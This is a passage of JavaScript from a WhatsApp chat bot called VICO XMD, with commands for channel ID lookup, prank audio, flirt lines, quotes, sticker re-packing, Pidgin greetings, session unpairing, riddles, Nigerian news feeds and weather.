and shows you the newsletter JID format.

💡 *The JID format:*
120363XXXXXXXXXX@newsletter
`);
    }
    
    await reply('🔍 *Extracting channel information...*');
    
    try {
        const link = text.trim();
        
        // ─── VALIDATE LINK ───
        if (!link.includes('whatsapp.com/channel/')) {
            return reply('❌ *Invalid channel link.*\n\nPlease provide a valid WhatsApp channel link like:\nhttps://whatsapp.com/channel/0029Vb5PzE5XpG7q9Zt3wR1X');
        }
        
        // ─── EXTRACT CHANNEL ID ───
        let channelId = null;
        const channelMatch = link.match(/channel\/([A-Za-z0-9_-]+)/i);
        if (channelMatch) {
            channelId = channelMatch[1];
        }
        
        if (!channelId) {
            return reply('❌ *Could not extract channel ID from the link.*');
        }
        
        // ─── GENERATE NEWSLETTER JID ───
        // WhatsApp newsletter JID format: 120363 + channelId numbers @newsletter
        let newsletterJid = null;
        
        // Try to extract numbers from channel ID
        const numbersOnly = channelId.replace(/[^0-9]/g, '');
        if (numbersOnly.length >= 10) {
            // If we have enough numbers, construct JID
            newsletterJid = `120363${numbersOnly.substring(0, 10)}@newsletter`;
        } else {
            // Fallback: use the full channel ID
            newsletterJid = `120363${channelId.replace(/[^0-9]/g, '')}@newsletter`;
        }
        
        // ─── TRY TO VERIFY NEWSLETTER ───
        let channelName = 'Unknown';
        let subscriberCount = 'Unknown';
        let verified = false;
        
        try {
            // Try to get newsletter info
            const info = await empire.newsletterInfo(newsletterJid).catch(() => null);
            if (info) {
                channelName = info.name || info.title || 'Unknown';
                subscriberCount = info.subscribers || 'Unknown';
                verified = true;
                console.log('✅ Newsletter verified:', info.name);
            }
        } catch (e) {
            console.log('Could not verify newsletter:', e.message);
        }
        
        // ─── BUILD RESPONSE ───
        let response = 
`📰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📰
        ✦  CHANNEL ID  ✦
📰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📰

📎 *Original Link:*
${link}

📌 *Channel ID:*
${channelId}

📌 *Newsletter JID:*
${newsletterJid}

${verified ? '✅ *Status:* Verified' : '⚠️ *Status:* Could not verify'}`;

        if (verified) {
            response += `
            
📛 *Channel Name:*
${channelName}

👥 *Subscribers:*
${subscriberCount}`;
        }

        response += `

📰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📰
💡 *How to use this JID:*

1. Copy the Newsletter JID above
2. Use it with the newsletter command:
   ${prefix}newsletter set ${newsletterJid} "${channelName}"

3. Or use it in your bot's config:
   global.newsletterJid = '${newsletterJid}'

📰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📰`;

        // ─── SEND RESPONSE ───
        await empire.sendMessage(m.chat, {
            text: response,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('Channel ID error:', e);
        reply(`❌ *Failed to extract channel ID:* ${e.message || 'Unknown error'}`);
    }
    break;
}

case 'prank':
case 'pr': {
    try {
        const audioUrl = 'https://files.catbox.moe/er5ytm.mp3';
        const response = await axios.get(audioUrl, {
            responseType: 'arraybuffer',
            timeout: 20000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        if (!response.data || response.data.length < 100) {
            return reply('❌ Failed to download prank audio.');
        }

        await empire.sendMessage(m.chat, {
            audio: Buffer.from(response.data),
            mimetype: 'audio/mpeg',
            ptt: false, // false = normal audio (plays properly on WhatsApp)
            contextInfo: newsletterContext()
        }, { quoted: m });

    } catch (e) {
        console.error('Prank audio error:', e.message);
        reply('❌ Failed to send prank audio. Try again later.');
    }
    break;
}


case 'flirt':
case 'rizz': {
    const rizzLines = [
        "Do you watch YouTube? Cuz I want you to be mine 😘",
        "Are you WiFi? Cuz I'm feeling a strong connection 📡",
        "Is your name Google? Because you have everything I've been searching for 🔍",
        "Are you a magician? Every time I look at you, everyone else disappears ✨",
        "If looks could kill, you'd be a weapon of mass destruction 😍",
        "Do you have a map? I just got lost in your eyes 🗺️",
        "Are you French? Because Eiffel for you 🗼",
        "Is your dad a baker? Cuz you're a cutie pie 🥧",
        "Are you a camera? Every time I look at you, I smile 📸",
        "Do you believe in love at first sight — or should I walk by again? 👀",
        "If you were a vegetable, you'd be a cute-cumber 🥒",
        "Are you made of copper and tellurium? Cuz you're Cu-Te 🔬",
        "Is your name Autumn? Cuz I'm falling for you 🍂",
        "Do you have a Band-Aid? I just scraped my knee falling for you 🩹",
        "Are you a parking ticket? Cuz you've got FINE written all over you 🚗",
        "If beauty were time, you'd be eternity ⏳",
        "Are you a loan? Cuz you have my interest 💸",
        "Do you work at Starbucks? Cuz I like you a latte ☕",
        "Are you lightning? Cuz my heart just raced ⚡",
        "Is it hot in here or is it just you? 🔥",
        "Are you a snowstorm? Cuz you make my heart race ❄️",
        "Do you have a sunburn, or are you always this hot? ☀️",
        "Are you a keyboard? Cuz you're my type ⌨️",
        "If you were a fruit, you'd be a fineapple 🍍",
        "Are you Australian? Cuz you meet all my koala-fications 🐨",
        "Do you play soccer? Cuz you're a keeper ⚽",
        "Are you a time traveler? Cuz I see you in my future 🚀",
        "Is your smile insured? Cuz it's precious 💎",
        "Are you gravity? Cuz I keep falling for you 🌍",
        "Do you have a pencil? I want to erase your past and write our future ✏️",
        "Are you Netflix? Cuz I could watch you for hours 📺",
        "If kisses were snowflakes, I'd send you a blizzard 💋",
        "Are you a campfire? Cuz you're hot and I want s'more 🔥",
        "Do you like raisins? How about a date? 🍇",
        "Are you a light switch? Cuz you turn me on 💡",
        "Is your name Chapstick? Cuz you're made for my lips 💄",
        "Are you a bank loan? You have my interest 📈",
        "Do you like Star Wars? Cuz Yoda one for me ⭐",
        "Are you a dictionary? Cuz you add meaning to my life 📖",
        "If you were a song, you'd be on my playlist forever 🎵",
        "Are you caffeine? Cuz you keep me up at night thinking of you ☕",
        "Do you have 11 protons? Cuz you're sodium fine 🔬",
        "Are you a charger? Cuz without you I'd die 🔋",
        "Is heaven missing an angel? Or did they send their best? 😇",
        "Are you a puzzle? Cuz I can't figure out how perfect you are 🧩",
        "Do you believe in fate? Cuz this feels written 📜",
        "Are you the ocean? Cuz I'm lost at sea in your eyes 🌊",
        "If I could rearrange the alphabet, I'd put U and I together 🔤",
        "Are you a star? Cuz your beauty lights up my world 🌟",
        "Do you have a name, or can I call you mine? 💍"
    ];

    const line = rizzLines[Math.floor(Math.random() * rizzLines.length)];

    let target = null;
    if (m.quoted && m.quoted.sender) target = m.quoted.sender;
    else if (m.mentionedJid?.[0]) target = m.mentionedJid[0];

    if (target) {
        const msg = `@${target.split('@')[0]} ${line}`;
        await empire.sendMessage(m.chat, {
            text: msg,
            mentions: [target],
            contextInfo: newsletterContext()
        }, { quoted: m });
    } else {
        await reply(`💘 *${line}*\n\n_Reply to someone or tag them with ${prefix}flirt_`);
    }
    break;
}

case 'quote':
case 'quotes':
case 'qotd': {
    const quotes = [
        { text: "The only way to do great work is to love what you do.", author: "Steve Jobs" },
        { text: "In the middle of every difficulty lies opportunity.", author: "Albert Einstein" },
        { text: "It does not matter how slowly you go as long as you do not stop.", author: "Confucius" },
        { text: "Success is not final, failure is not fatal: it is the courage to continue that counts.", author: "Winston Churchill" },
        { text: "Believe you can and you're halfway there.", author: "Theodore Roosevelt" },
        { text: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" },
        { text: "Do what you can, with what you have, where you are.", author: "Theodore Roosevelt" },
        { text: "Everything you’ve ever wanted is on the other side of fear.", author: "George Addair" },
        { text: "Hardships often prepare ordinary people for an extraordinary destiny.", author: "C.S. Lewis" },
        { text: "Don’t watch the clock; do what it does. Keep going.", author: "Sam Levenson" },
        { text: "The best time to plant a tree was 20 years ago. The second best time is now.", author: "Chinese Proverb" },
        { text: "You miss 100% of the shots you don’t take.", author: "Wayne Gretzky" },
        { text: "Whether you think you can or you think you can’t, you’re right.", author: "Henry Ford" },
        { text: "I have not failed. I've just found 10,000 ways that won't work.", author: "Thomas Edison" },
        { text: "The only limit to our realization of tomorrow is our doubts of today.", author: "Franklin D. Roosevelt" },
        { text: "Act as if what you do makes a difference. It does.", author: "William James" },
        { text: "What you get by achieving your goals is not as important as what you become by achieving your goals.", author: "Zig Ziglar" },
        { text: "Keep your face always toward the sunshine—and shadows will fall behind you.", author: "Walt Whitman" },
        { text: "The secret of getting ahead is getting started.", author: "Mark Twain" },
        { text: "It always seems impossible until it’s done.", author: "Nelson Mandela" },
        { text: "Don’t let yesterday take up too much of today.", author: "Will Rogers" },
        { text: "You are never too old to set another goal or to dream a new dream.", author: "C.S. Lewis" },
        { text: "If you want to lift yourself up, lift up someone else.", author: "Booker T. Washington" },
        { text: "The harder you work for something, the greater you’ll feel when you achieve it.", author: "Unknown" },
        { text: "Dream big and dare to fail.", author: "Norman Vaughan" },
        { text: "Quality is not an act, it is a habit.", author: "Aristotle" },
        { text: "The best revenge is massive success.", author: "Frank Sinatra" },
        { text: "Life is 10% what happens to us and 90% how we react to it.", author: "Charles R. Swindoll" },
        { text: "Do not wait to strike till the iron is hot; but make it hot by striking.", author: "William Butler Yeats" },
        { text: "Great things never come from comfort zones.", author: "Unknown" },

        { text: "The only impossible journey is the one you never begin.", author: "Tony Robbins" },
        { text: "What we think, we become.", author: "Buddha" },
        { text: "Happiness is not something ready made. It comes from your own actions.", author: "Dalai Lama" },
        { text: "Turn your wounds into wisdom.", author: "Oprah Winfrey" },
        { text: "Doubt kills more dreams than failure ever will.", author: "Suzy Kassem" },
        { text: "Be yourself; everyone else is already taken.", author: "Oscar Wilde" },
        { text: "We are what we repeatedly do. Excellence, then, is not an act, but a habit.", author: "Aristotle" },
        { text: "The best way out is always through.", author: "Robert Frost" },
        { text: "Courage is resistance to fear, mastery of fear — not absence of fear.", author: "Mark Twain" },
        { text: "Do one thing every day that scares you.", author: "Eleanor Roosevelt" },
        { text: "A person who never made a mistake never tried anything new.", author: "Albert Einstein" },
        { text: "Your time is limited, so don’t waste it living someone else’s life.", author: "Steve Jobs" },
        { text: "In three words I can sum up everything I’ve learned about life: it goes on.", author: "Robert Frost" },
        { text: "Strive not to be a success, but rather to be of value.", author: "Albert Einstein" },
        { text: "The only person you are destined to become is the person you decide to be.", author: "Ralph Waldo Emerson" },
        { text: "Go confidently in the direction of your dreams.", author: "Henry David Thoreau" },
        { text: "It is never too late to be what you might have been.", author: "George Eliot" },
        { text: "Everything has beauty, but not everyone sees it.", author: "Confucius" },
        { text: "The mind is everything. What you think you become.", author: "Buddha" },
        { text: "Change your thoughts and you change your world.", author: "Norman Vincent Peale" }
    ];

    const pick = quotes[Math.floor(Math.random() * quotes.length)];

    const msg =
        `📖 *QUOTE OF THE MOMENT*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `_"${pick.text}"_\n\n` +
        `— *${pick.author}*\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `_Type ${prefix}quote for another_`;

    await reply(msg);
    break;
}

case 'thief':
case 'sbsnal': {
    try {
        // Must reply to a sticker
        if (!m.quoted) {
            return reply(
                `🎭 *Steal Sticker*\n\n` +
                `*Usage:* Reply to a sticker with:\n` +
                `› ${prefix}take\n` +
                `› ${prefix}take MyPack | MyName\n\n` +
                `*Example:*\n` +
                `› ${prefix}take VICO XMD | RMS`
            );
        }

        const mime = m.quoted.mimetype || '';
        if (!/webp|sticker/.test(mime) && !m.quoted.message?.stickerMessage) {
            return reply('❌ Reply to a *sticker* only.');
        }

        // Pack name & author
        let packname = global.packname || '𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳';
        let author = global.OWNER_NAME || m.pushName || '𝐑𝐌𝐒';

        if (text) {
            const split = text.split('|');
            if (split[0]?.trim()) packname = split[0].trim();
            if (split[1]?.trim()) author = split[1].trim();
        }

        await reply('⏳ Stealing sticker...');

        // Download sticker
        let mediaBuffer = await empire.downloadMediaMessage(m.quoted);
        if (!mediaBuffer || mediaBuffer.length < 50) {
            return reply('❌ Failed to download sticker.');
        }

        // Rebuild with new pack using wa-sticker-formatter (most reliable)
        const { Sticker } = require('wa-sticker-formatter');
        const sticker = new Sticker(mediaBuffer, {
            pack: packname,
            author: author,
            type: 'default',
            categories: ['🤩', '🎉'],
            id: 'vico-steal',
            quality: 100,
            background: 'transparent'
        });

        const stickerBuffer = await sticker.toBuffer();

        if (!stickerBuffer || stickerBuffer.length < 50) {
            return reply('❌ Failed to process sticker.');
        }

        // Send the stolen sticker (user can long-press → Add to Stickers)
        await empire.sendMessage(m.chat, {
            sticker: stickerBuffer,
            contextInfo: newsletterContext()
        }, { quoted: m });

    } catch (e) {
        console.error('TAKE ERROR:', e);
        reply(`❌ Failed to steal sticker: ${e.message || 'Unknown error'}`);
    }
    break;
}

case 'greet':
case 'howfar': {
    let greets = [
        "How far na? VICO XMD dey online, you dey feel am? 😎",
        "Omo! Na you be this? How body? VICO don active!",
        "My gee! How far? Everything soft? Make we run am!",
        "Boss! You don show. How street dey? 🫡",
        "Aza man don land! How far, you good? 😂",
        "How far my padi? VICO XMD dey here, no dulling!",
        "Oga! You don show face. How levels? Make we cruise!",
        "How far, Idolo? Everything stew? VICO dey set!",
        "Yo yo! How far na? Hope say light dey your side? 💡",
        "Chairman! How far? You don hammer today?",
        "My person! Long time, how far? VICO don miss you!",
        "How far bros? Hope hustle dey pay? No give up!",
        "Sisi! How far? You still dey fine like filter? 😍",
        "How far Alhaji? VICO dey loyal, we dey active!",
        "Omo X 1000! How far? You don chop today? Make I order?",
        "How far legend? Your group don feel VICO today?",
        "Boss lady! How far? VICO XMD dey at your service!",
        "How far my gee? Make we yarn small, you dey free?",
        "Wetin dey sup? How far? VICO XMD don full ground!",
        "How far, cruise master? You ready to catch cruise today?",
        "My main man! How far? Street soft for your side?",
        "How far senior man? Respect! VICO dey hail you!",
        "Oya now, how far? Make we run am, time no dey! ⏰",
        "How far, big vibe? Na you be real MVP today!",
        "How far? No be lie, your presence light up the group! ✨"
    ];

    let msg = greets[Math.floor(Math.random() * greets.length)];

    // If replied to someone → tag them
    if (m.quoted && m.quoted.sender) {
        const target = m.quoted.sender;
        msg = `@${target.split('@')[0]} ${msg}`;

        await empire.sendMessage(m.chat, {
            text: msg,
            mentions: [target],
            contextInfo: newsletterContext()
        }, { quoted: m });
    } else {
        // Normal greet (no tag)
        await reply(msg);
    }
    break;
}

case 'delpair':
case 'unpair':
case 'deletepair': {
    if (!isCreator) return reply('🔒 *Owner only.*');

    const raw = (text || args[0] || '').replace(/[^0-9]/g, '');
    if (!raw || raw.startsWith('0') || !/^\d{7,15}$/.test(raw)) {
        return reply(
            `🗑️ *DELPAIR*\n\n` +
            `*Usage:*\n` +
            `› ${prefix}delpair <number>\n\n` +
            `*Example:*\n` +
            `› ${prefix}delpair 234712727263\n\n` +
            `_Removes the paired session for that number._`
        );
    }

    try {
        const pairingDir = path.join(STORAGE_DIR, 'session-data', 'pairing');

        if (!fs.existsSync(pairingDir)) {
            return reply(`🔴 *No session found*\n\nNumber *+${raw}* is not paired.`);
        }

        // Folder may be stored as "234..." or "234...@s.whatsapp.net"
        const entries = fs.readdirSync(pairingDir, { withFileTypes: true });
        const matched = entries.find(entry => {
            if (!entry.isDirectory()) return false;
            const digits = entry.name.replace(/[^0-9]/g, '');
            return digits === raw;
        });

        if (!matched) {
            return reply(`🔴 *NOT FOUND*\n\n*+${raw}* is not paired.`);
        }

        const targetPath = path.join(pairingDir, matched.name);
        fs.rmSync(targetPath, { recursive: true, force: true });

        // Also clean pairing.json entry if present
        try {
            const pj = path.join(pairingDir, 'pairing.json');
            if (fs.existsSync(pj)) {
                const data = JSON.parse(fs.readFileSync(pj, 'utf8'));
                if (data && (data.number === raw || data.number === `${raw}@s.whatsapp.net`)) {
                    fs.unlinkSync(pj);
                }
            }
        } catch (_) {}

        return reply(
            `🔵 *DEVICE REMOVED*\n\n` +
            `✅ *+${raw}* has been unlinked successfully.\n\n` +
            `_Session deleted. They will need to pair again._`
        );
    } catch (err) {
        console.error('Delpair error:', err);
        return reply(`🔴 *DELETE FAILED*\n\n${err.message}`);
    }
    break;
}

case 'riddle': {
  const riddles = [
    { q: "What has keys but can't open locks?", a: ["keyboard", "piano"] },
    { q: "What has hands but can't clap?", a: ["clock"] },
    { q: "What gets wetter the more it dries?", a: ["towel"] },
    { q: "I speak without a mouth and hear without ears. I have no body, but come alive with wind. What am I?", a: ["echo"] },
    { q: "The more you take, the more you leave behind. What are they?", a: ["footsteps", "footstep", "steps"] },
    { q: "What has one eye but can't see?", a: ["needle"] },
    { q: "What has a neck but no head?", a: ["bottle"] },
    { q: "What can travel around the world while staying in one corner?", a: ["stamp"] },
    { q: "What has many teeth but cannot bite?", a: ["comb"] },
    { q: "What goes up but never comes down?", a: ["age"] },
    { q: "What belongs to you but others use it more than you do?", a: ["name", "your name"] },
    { q: "I'm full of holes but still holds water. What am I?", a: ["sponge"] },
    { q: "What has to be broken before you can use it?", a: ["egg"] },
    { q: "What is black when it's clean and white when it's dirty?", a: ["blackboard", "chalkboard"] },
    { q: "What gets bigger when more is taken away?", a: ["hole"] },
    { q: "If you have me, you want to share me. If you share me, you haven't got me. What am I?", a: ["secret"] },
    { q: "What is so fragile that saying its name breaks it?", a: ["silence"] },
    { q: "What goes up and down but doesn't move?", a: ["stairs", "staircase"] },
    { q: "What has words but never speaks?", a: ["book"] },
    { q: "What building has the most stories?", a: ["library"] },
    { q: "What has cities but no houses, mountains but no trees, and water but no fish?", a: ["map"] },
    { q: "What can fill a room but takes up no space?", a: ["light"] },
    { q: "What can you catch but not throw?", a: ["cold", "flu"] },
    { q: "What has one head, one foot and four legs?", a: ["bed"] },
    { q: "Poor people have it, rich need it, if you eat it you die. What is it?", a: ["nothing"] },
    { q: "What has 13 hearts but no other organs?", a: ["deck of cards", "cards", "playing cards"] },
    { q: "What has 88 keys but can't open a single door?", a: ["piano"] },
    { q: "What comes once in a minute, twice in a moment, and never in a thousand years?", a: ["m", "letter m"] },
    { q: "I am tall when I am young and short when I am old. What am I?", a: ["candle", "pencil"] },
    { q: "What English word has three consecutive double letters?", a: ["bookkeeper"] },
    { q: "What begins with T, ends with T, and has T in it?", a: ["teapot"] },
    { q: "Forward I am heavy, but backward I am not. What am I?", a: ["ton", "not"] },
    { q: "What month do people sleep the least?", a: ["february"] },
    { q: "What has 4 wheels and flies?", a: ["garbage truck", "trash truck"] },
    { q: "If you drop me, I'm sure to crack. But give me a smile and I smile back. What am I?", a: ["mirror"] },
    { q: "What has a thumb and four fingers but is not alive?", a: ["glove"] },
    { q: "What is always in front of you but can't be seen?", a: ["future"] },
    { q: "I am an odd number. Take away one letter and I become even. What am I?", a: ["seven"] },
    { q: "What 5-letter word becomes shorter when you add two letters to it?", a: ["short"] },
    // ——— extra 25 ———
    { q: "What has a face and two hands but no arms or legs?", a: ["clock"] },
    { q: "What runs but never walks, has a bed but never sleeps?", a: ["river"] },
    { q: "What can you break without touching it?", a: ["promise", "a promise"] },
    { q: "What has ears but cannot hear?", a: ["corn", "maize"] },
    { q: "What is full of holes but still holds water?", a: ["sponge"] },
    { q: "What has a head, a tail, is brown, and has no legs?", a: ["penny", "coin"] },
    { q: "What invents what it loves and loves what it invents?", a: ["artist", "an artist"] },
    { q: "What is always coming but never arrives?", a: ["tomorrow"] },
    { q: "What has no beginning, end, or middle?", a: ["doughnut", "donut", "ring"] },
    { q: "What kind of room has no doors or windows?", a: ["mushroom"] },
    { q: "What is light as a feather but the strongest man can't hold for long?", a: ["breath"] },
    { q: "What goes through cities and fields but never moves?", a: ["road", "highway"] },
    { q: "What has four legs in the morning, two at noon, and three in the evening?", a: ["man", "human", "person"] },
    { q: "What can travel around the world without leaving its corner?", a: ["stamp", "postage stamp"] },
    { q: "What is so delicate that saying its name destroys it?", a: ["silence"] },
    { q: "What has a bottom at the top?", a: ["leg", "your leg"] },
    { q: "What word is spelled wrong in every dictionary?", a: ["wrong"] },
    { q: "What has many keys but can't open a single lock?", a: ["piano", "keyboard"] },
    { q: "What disappears as soon as you say its name?", a: ["silence"] },
    { q: "What has branches but no fruit, leaves or wood?", a: ["bank"] },
    { q: "What is bought by the yard and worn by the foot?", a: ["carpet", "rug"] },
    { q: "What has a neck but no head, and wears a cap?", a: ["bottle"] },
    { q: "What can jump higher than a building?", a: ["anything", "everything", "all things"] },
    { q: "What has cities, forests, water, and deserts, but no houses, trees, fish or sand?", a: ["map"] },
    { q: "What is white when dirty and black when clean?", a: ["blackboard", "chalkboard"] },
  ,
{ q: 'I have cities, but no houses; forests, but no trees; water, but no fish. What am I?', a: ['map', 'a map'] },
{ q: 'The more of this there is, the less you see. What is it?', a: ['darkness', 'dark'] },
{ q: 'What invention lets you look through a wall?', a: ['window', 'a window'] },
{ q: 'What has a head, a tail, is brown, and has no legs?', a: ['penny', 'coin', 'a penny'] },
{ q: 'What can run but never walks, has a mouth but never talks?', a: ['river', 'a river'] },
{ q: 'What building has the most stories?', a: ['library', 'a library'] },
{ q: 'What word is spelled incorrectly in every dictionary?', a: ['incorrectly'] },
{ q: 'What has four wheels and flies?', a: ['garbage truck', 'bin lorry', 'rubbish truck'] },
{ q: 'What comes once in a minute, twice in a moment, but never in a thousand years?', a: ['m', 'letter m', 'the letter m'] },
{ q: 'What breaks when you say it?', a: ['silence'] },
{ q: 'Forward I am heavy, backward I am not. What am I?', a: ['ton'] },
{ q: "What has keys but can't open locks, space but no room, and you can enter but not go outside?", a: ['keyboard'] },
{ q: 'I am always hungry and will die if not fed, but whatever I touch will soon turn red. What am I?', a: ['fire'] },
{ q: 'What can fill a room but takes up no space?', a: ['light', 'air', 'smell'] },
{ q: "If you drop me I'm sure to crack, but give me a smile and I'll always smile back. What am I?", a: ['mirror'] },
{ q: 'What has one head, one foot, and four legs?', a: ['bed'] },
{ q: 'What is so delicate that saying its name breaks it?', a: ['silence'] },
{ q: 'What goes through cities and fields but never moves?', a: ['road', 'a road'] },
{ q: 'I speak without a mouth and hear without ears. I have no body, but come alive with wind. What am I?', a: ['echo'] },
{ q: 'What has a neck but no head?', a: ['bottle', 'a bottle'] },
{ q: 'What can travel around the world while staying in a corner?', a: ['stamp'] },
{ q: 'What gets wetter the more it dries?', a: ['towel'] },
{ q: 'What has many rings but no fingers?', a: ['tree', 'onion', 'phone'] },
{ q: 'What disappears as soon as you say its name?', a: ['silence'] },
{ q: 'I have branches, but no fruit, trunk, or leaves. What am I?', a: ['bank'] },
{ q: 'What kind of room has no doors or windows?', a: ['mushroom'] },
{ q: 'What has hands but cannot clap?', a: ['clock'] },
{ q: 'What runs around a whole yard without moving?', a: ['fence'] },
{ q: 'What has a face and two hands but no arms or legs?', a: ['clock'] },
{ q: 'What can you catch but not throw?', a: ['cold', 'a cold'] },
{ q: 'What has teeth but cannot bite?', a: ['comb', 'zipper', 'gear'] },
{ q: 'What is full of holes but still holds water?', a: ['sponge'] },
{ q: 'What goes up but never comes down?', a: ['age'] },
{ q: 'What belongs to you but others use it more than you?', a: ['name', 'your name'] },
{ q: 'What has an eye but cannot see?', a: ['needle', 'storm'] },
{ q: 'What starts with T, ends with T, and has T in it?', a: ['teapot'] },
{ q: 'What is always in front of you but cannot be seen?', a: ['future'] },
{ q: 'What two things can you never eat for breakfast?', a: ['lunch and dinner', 'lunch dinner'] },
{ q: 'What is black when you buy it, red when you use it, and gray when you throw it away?', a: ['charcoal', 'coal'] },
{ q: 'What question can you never answer yes to?', a: ['are you asleep', 'are you dead', 'asleep'] }
];
  global.riddleGame = global.riddleGame || {};
  if (args.length > 0) {
    if (!global.riddleGame[m.chat]) return reply("❌ No active riddle. Type *.riddle* to start a new one.");
    let userAns = args.join(" ").toLowerCase().trim();
    let correctAns = global.riddleGame[m.chat].a;
    let isCorrect = correctAns.some(ans => userAns.includes(ans) || ans.includes(userAns));
    if (isCorrect) {
      let q = global.riddleGame[m.chat].q;
      delete global.riddleGame[m.chat];
      return reply('✅ *CORRECT! 💯*\n\n*Question:* ' + q + '\n*Your Answer:* ' + userAns + '\n*Correct:* ' + correctAns[0].toUpperCase() + '\n\nType *.riddle* for next.');
    } else {
      return reply('❌ *WRONG!* You said: *' + userAns + '*\nTry again or type *.rans*');
    }
  }
  const random = riddles[Math.floor(Math.random() * riddles.length)];
  global.riddleGame[m.chat] = random;
  await reply('🧩 *VICO XMD RIDDLE*\n\n*Q:* ' + random.q + '\n\nReply: *.riddle <answer>*\nType *.rans* to reveal\n⏰ Auto reveals in 60s');
  setTimeout(async () => {
    if (global.riddleGame[m.chat] && global.riddleGame[m.chat].q === random.q) {
      await empire.sendMessage(m.chat, { text: '⏰ *TIME UP!*\n*Q:* ' + random.q + '\n*Answer:* ' + random.a[0].toUpperCase() }).catch(() => {});
      delete global.riddleGame[m.chat];
    }
  }, 60000);
  break;
}
case 'rans':
case 'riddleanswer':
case 'ranswer': {
  global.riddleGame = global.riddleGame || {};
  if (!global.riddleGame[m.chat]) return reply("❌ No active riddle. Type *.riddle* to start.");
  let ans = global.riddleGame[m.chat];
  await reply('🧩 *ANSWER*\n\n*Q:* ' + ans.q + '\n*Answer:* ' + ans.a[0].toUpperCase());
  delete global.riddleGame[m.chat];
  break;
}

// ═══════════════════════════════════════════════════
// NEWS NAIJA — Nigeria-focused, shuffled each time
// ═══════════════════════════════════════════════════
case '9ja':
case 'news':
case '9janews': {
  try {
    await reply("*🔍 Fetching latest Nigeria news...*");

    const feeds = [
      'https://feeds.bbci.co.uk/news/world/africa/rss.xml',
      'https://www.premiumtimesng.com/feed',
      'https://www.vanguardngr.com/feed/',
      'https://punchng.com/feed/',
      'https://www.channelstv.com/feed/'
    ];

    // Pick 2–3 random feeds so results change each run
    const shuffledFeeds = feeds.sort(() => Math.random() - 0.5).slice(0, 3);
    let allItems = [];

    for (const feed of shuffledFeeds) {
      try {
        const rss = await axios.get(
          'https://api.rss2json.com/v1/api.json?rss_url=' + encodeURIComponent(feed),
          { timeout: 15000 }
        );
        const items = (rss.data?.items || []).map(a => ({
          title: a.title || '',
          description: String(a.description || '').replace(/<[^>]*>/g, ''),
          link: a.link || '',
          source: rss.data?.feed?.title || 'Naija News'
        }));
        allItems = allItems.concat(items);
      } catch (_) {}
    }

    // Prefer Nigeria-related headlines, then fill the rest
    const ngWords = /nigeria|lagos|abuja|naira|tinubu|buhari|afcon|super eagles|nnpc|inec|aso rock|yoruba|igbo|hausa|nigerian/i;
    let ngItems = allItems.filter(i => ngWords.test(i.title + ' ' + i.description));
    let others = allItems.filter(i => !ngWords.test(i.title + ' ' + i.description));

    // Shuffle both pools
    ngItems = ngItems.sort(() => Math.random() - 0.5);
    others = others.sort(() => Math.random() - 0.5);

    let picked = ngItems.slice(0, 8);
    if (picked.length < 8) picked = picked.concat(others.slice(0, 8 - picked.length));
    if (!picked.length) picked = allItems.sort(() => Math.random() - 0.5).slice(0, 8);

    if (!picked.length) return reply('❌ No news available right now. Try again.');

    let msg = '🇳🇬 *VICO XMD — NAIJA NEWS*\n*' + new Date().toLocaleDateString('en-NG') + '*\n\n';
    picked.forEach((a, i) => {
      msg += '*' + (i + 1) + '. ' + a.title + '*\n';
      msg += String(a.description).slice(0, 110).trim() + '...\n';
      if (a.link) msg += '🔗 ' + a.link + '\n';
      msg += '\n';
    });
    msg += '_Type .newsnaija again for different headlines_';

    await empire.sendMessage(m.chat, {
      text: msg.slice(0, 4000),
      contextInfo: newsletterContext()
    }, { quoted: m });
  } catch (e) {
    console.error('newsnaija:', e.message);
    reply("❌ Failed to fetch news. Try again later.");
  }
  break;
}

// ═══════════════════════════════════════════════════
// TP (temperature / weather)
// ═══════════════════════════════════════════════════

case 'temperature':
case 'temp':
case 'weather': {
    const qloc = (text || args.join(' ') || '').trim();
    if (!qloc) return reply(`🌡️ Usage: ${prefix}temperature <city/country>\nExample: ${prefix}temperature Lagos\nExample: ${prefix}temperature London`);
    await reply('🌡️ *Fetching weather...*');
    try {
        let out = null;
        // Open-Meteo geocoding + forecast (free, worldwide, no key)
        const geo = await axios.get('https://geocoding-api.open-meteo.com/v1/search', {
            params: { name: qloc, count: 1, language: 'en', format: 'json' }, timeout: 15000
        });
        const place = geo.data?.results?.[0];
        if (!place) return reply('❌ Location not found. Try another city name.');
        const { latitude, longitude, name, country, admin1 } = place;
        const wx = await axios.get('https://api.open-meteo.com/v1/forecast', {
            params: {
                latitude, longitude,
                current: 'temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m',
                timezone: 'auto'
            }, timeout: 15000
        });
        const c = wx.data?.current || {};
        const code = c.weather_code;
        const wmap = {0:'Clear ☀️',1:'Mainly clear 🌤',2:'Partly cloudy ⛅',3:'Overcast ☁️',45:'Fog 🌫',48:'Fog 🌫',51:'Drizzle 🌦',61:'Rain 🌧',63:'Rain 🌧',65:'Heavy rain 🌧',71:'Snow ❄️',80:'Showers 🌦',95:'Thunderstorm ⛈'};
        const cond = wmap[code] || ('Code ' + code);
        out =
`🌡️ *WEATHER — ${name}${admin1 ? ', ' + admin1 : ''}${country ? ', ' + country : ''}*

• Temperature: *${c.temperature_2m}°C*
• Feels like: *${c.apparent_temperature}°C*
• Humidity: *${c.relative_humidity_2m}%*
• Wind: *${c.wind_speed_10m} km/h*
• Condition: *${cond}*
• Time: ${c.time || 'now'}

_Worldwide • Open-Meteo_`;
        reply(out);
    } catch (e) {
        reply('❌ Weather error: ' + (e.message || 'failed'));
    }
    break;
}


// ═══════════════════════════════════════════════════
// 4K WALLPAPER
// ═══════════════════════════════════════════════════
case '4k':
case '4kwallpaper':
case 'wallpaper': {
  try {
    const q = (text || 'nature').trim();
    await reply('🖼️ *Searching wallpapers for:* ' + q);
    const headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
    let sent = false;
    // 1) wallhaven
    try {
